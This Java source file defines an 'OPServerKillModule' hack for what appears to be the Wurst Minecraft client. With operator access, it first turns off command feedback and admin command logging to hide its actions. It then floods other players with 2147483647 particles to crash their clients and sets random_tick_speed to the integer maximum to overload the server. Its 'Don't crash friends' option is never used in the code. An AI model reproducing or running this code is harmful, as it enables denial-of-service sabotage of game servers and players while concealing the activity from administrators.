/*
 * Copyright (c) 2014-2026 Wurst-Imperium and contributors.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package net.wurstclient.hacks.ophack;

import net.wurstclient.Category;

import java.util.ArrayDeque;
import java.util.Queue;
import net.wurstclient.events.UpdateListener;
import net.wurstclient.hack.Hack;
import net.wurstclient.settings.CheckboxSetting;
import net.wurstclient.settings.SliderSetting;
import net.wurstclient.settings.SliderSetting.ValueDisplay;

public final class OPServerKillModuleHack extends Hack implements UpdateListener
{
	private final CheckboxSetting restrictSingleplayer = new CheckboxSetting(
		"Restrict singleplayer", "Do not run in local worlds.", true);
	private final CheckboxSetting hideFeedback =
		new CheckboxSetting("Hide command feedback",
			"Send the command feedback gamerule first.", true);
	private final CheckboxSetting hideAdminLog =
		new CheckboxSetting("Hide admin log",
			"Send the admin command logging gamerule first.", true);
	private final CheckboxSetting crashPlayers =
		new CheckboxSetting("Crash other players",
			"Send the particle payload before the kill command.", true);
	private final CheckboxSetting dontCrashFriends =
		new CheckboxSetting("Don't crash friends",
			"Compatibility option for friend filtering.", true);
	private final SliderSetting delay = new SliderSetting("Tick delay",
		"Ticks between commands.", 3, 3, 20, 1, ValueDisplay.INTEGER);
	private final SliderSetting randomTickSpeed = new SliderSetting(
		"randomTickSpeed", "Value used for the server kill command.",
		Integer.MAX_VALUE, 0, Integer.MAX_VALUE, 1, ValueDisplay.INTEGER);
	private final Queue<String> queue = new ArrayDeque<>();
	private int ticks;
	
	public OPServerKillModuleHack()
	{
		super("OPServerKillModule",
			"Runs the original server-control command sequence.", false);
		setCategory(Category.CREATIVE_OP);
		addSetting(restrictSingleplayer);
		addSetting(hideFeedback);
		addSetting(hideAdminLog);
		addSetting(crashPlayers);
		addSetting(dontCrashFriends);
		addSetting(delay);
		addSetting(randomTickSpeed);
	}
	
	@Override
	protected void onEnable()
	{
		queue.clear();
		if(restrictSingleplayer.isChecked() && MC.isLocalServer())
		{
			setEnabled(false);
			return;
		}
		if(hideFeedback.isChecked())
			queue.add("gamerule send_command_feedback false");
		if(hideAdminLog.isChecked())
			queue.add("gamerule log_admin_commands false");
		if(crashPlayers.isChecked())
			queue.add("execute at @a[name=!"
				+ (MC.player == null ? "" : MC.player.getName().getString())
				+ "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a");
		queue.add("gamerule random_tick_speed " + randomTickSpeed.getValueI());
		ticks = 0;
		EVENTS.add(UpdateListener.class, this);
	}
	
	@Override
	protected void onDisable()
	{
		EVENTS.remove(UpdateListener.class, this);
		queue.clear();
	}
	
	@Override
	public void onUpdate()
	{
		if(MC.getConnection() == null)
			return;
		if(queue.isEmpty())
		{
			setEnabled(false);
			return;
		}
		if(ticks++ < delay.getValueI())
			return;
		ticks = 0;
		String command = queue.poll();
		if(command.length() <= 256)
			MC.getConnection().sendCommand(command);
	}
}
